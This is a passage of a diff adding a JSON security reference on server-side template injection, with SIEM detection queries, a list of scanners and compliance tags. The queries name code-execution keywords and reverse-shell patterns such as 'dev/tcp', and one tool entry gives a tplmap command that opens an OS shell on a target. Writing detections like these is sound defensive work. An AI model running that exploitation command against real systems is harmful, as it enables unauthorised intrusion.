+        "query": "index=web_logs sourcetype=access_combined\n| rex field=uri_query \"(?<template_syntax>\\{\\{|\\$\\{|<%|#\\{)\"\n| where isnotnull(template_syntax)\n| rex field=uri_query \"(?<dangerous_keywords>__class__|__mro__|__import__|freemarker\\\\.template|Runtime|ProcessBuilder|eval|exec|system)\"\n| where isnotnull(dangerous_keywords)\n| stats count as attempts, values(uri) as targeted_endpoints, dc(src_ip) as unique_ips by src_ip, dangerous_keywords\n| where attempts > 5\n| eval severity=\"critical\"\n| table _time, src_ip, attempts, dangerous_keywords, targeted_endpoints, severity"
+      },
+      {
+        "siem": "Elastic Stack (KQL)",
+        "query": "event.category: \"web\" AND (\n  url.query: (*{{* OR *${* OR *<%* OR *#{*) AND\n  url.query: (*__class__* OR *__mro__* OR *__import__* OR *freemarker.template* OR *Runtime* OR *exec* OR *eval*)\n)\n| stats count() by source.ip, url.path"
+      },
+      {
+        "siem": "AWS CloudWatch Insights",
+        "query": "fields @timestamp, @message\n| filter @message like /\\{\\{|\\$\\{|<%/\n| filter @message like /__class__|__mro__|__import__|freemarker\\.template|Runtime|eval|exec/\n| parse @message /^(?<client_ip>\\S+) .* \"(?<method>\\S+) (?<uri>\\S+) (?<protocol>\\S+)\" (?<status>\\d+)/\n| stats count() as attempt_count by client_ip, uri\n| filter attempt_count > 3\n| sort attempt_count desc"
+      },
+      {
+        "siem": "Microsoft Defender for Cloud",
+        "query": "// Detect reverse shell connections from web servers\nSecurityEvent\n| where EventID == 4688 // Process creation\n| where ParentProcessName contains \"w3wp.exe\" or ParentProcessName contains \"nginx\" or ParentProcessName contains \"apache\"\n| where NewProcessName contains \"bash\" or NewProcessName contains \"sh\" or NewProcessName contains \"cmd.exe\" or NewProcessName contains \"powershell.exe\"\n| where CommandLine contains \"tcp\" or CommandLine contains \"dev/tcp\" or CommandLine contains \"exec\"\n| project TimeGenerated, Computer, ParentProcessName, NewProcessName, CommandLine, User\n| order by TimeGenerated desc"
+      }
+    ],
+    "tools": [
+      {
+        "name": "tplmap",
+        "type": "SSTI Scanner",
+        "usage": "python tplmap.py -u 'https://target.com/page?template=*' --os-shell"
+      },
+      {
+        "name": "Burp Suite Pro - Template Injection Scanner",
+        "type": "Vulnerability Scanner",
+        "usage": "Automated detection of SSTI via active scanning"
+      },
+      {
+        "name": "OWASP ZAP SSTI Plugin",
+        "type": "DAST Scanner",
+        "usage": "Enable SSTI scanning in active scan rules"
+      },
+      {
+        "name": "Semgrep SSTI Rules",
+        "type": "SAST Scanner",
+        "usage": "semgrep --config=p/owasp-top-ten --config=p/template-injection /path/to/code"
+      }
+    ]
+  },
+  "metadata_tags": {
+    "industry": [
+      "Financial Services",
+      "Healthcare",
+      "E-commerce",
+      "SaaS",
+      "Government",
+      "Technology"
+    ],
+    "compliance": [
+      "PCI-DSS 4.0 (Requirement 6.2.4)",
+      "HIPAA (164.312(a)(1))",
+      "SOC2 (CC7.1)",
+      "ISO27001 (A.14.2.1)",
+      "GDPR (Article 32)",
+      "NIST 800-53 (SI-10, SI-15)",
+      "CIS Controls v8 (16.11)"
+    ],
+    "deployment": [
+      "Cloud",
+      "On-Premise",
+      "Hybrid",
+      "Container",
+      "Serverless"
+    ],
+    "data_classification": [
+      "Critical",
+      "Confidential",
+      "Sensitive"
+    ]
+  }
+}
